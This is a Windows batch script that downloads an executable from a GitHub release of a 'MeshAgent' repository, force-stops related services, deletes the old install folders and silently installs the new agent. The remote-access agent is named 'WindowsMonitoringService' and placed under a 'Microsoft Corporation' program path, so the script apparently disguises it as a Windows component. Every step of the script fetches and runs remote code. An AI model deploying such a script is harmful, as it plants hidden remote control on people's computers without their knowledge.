@echo off
set LOGDIR=C:\Temp\NoWin
set LOGFILE=%LOGDIR%\force-update-agent.log

if not exist %LOGDIR% mkdir %LOGDIR%

echo ===== SCRIPT START %DATE% %TIME% ===== >> %LOGFILE%
whoami >> %LOGFILE%

echo Downloading installer... >> %LOGFILE%

powershell -NoProfile -Command ^
"Invoke-WebRequest -UseBasicParsing -Uri 'https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe' -OutFile '%LOGDIR%\agent.exe'" >> %LOGFILE% 2>&1

if not exist %LOGDIR%\agent.exe (
    echo DOWNLOAD FAILED >> %LOGFILE%
    exit /b 1
)

echo Stopping services... >> %LOGFILE%
sc stop meshagent >> %LOGFILE% 2>&1
sc stop WindowsMonitoringService >> %LOGFILE% 2>&1
taskkill /F /IM meshagent.exe >> %LOGFILE% 2>&1
taskkill /F /IM WindowsMonitoringService*.exe >> %LOGFILE% 2>&1

echo Removing old folders... >> %LOGFILE%
rmdir /S /Q "C:\Program Files\Mesh Agent" >> %LOGFILE% 2>&1
rmdir /S /Q "C:\Program Files\Microsoft Corporation\WindowsMonitoringService" >> %LOGFILE% 2>&1

echo Installing new agent... >> %LOGFILE%
"%LOGDIR%\agent.exe" --fullinstall >> %LOGFILE% 2>&1

echo ===== SCRIPT END %DATE% %TIME% ===== >> %LOGFILE%
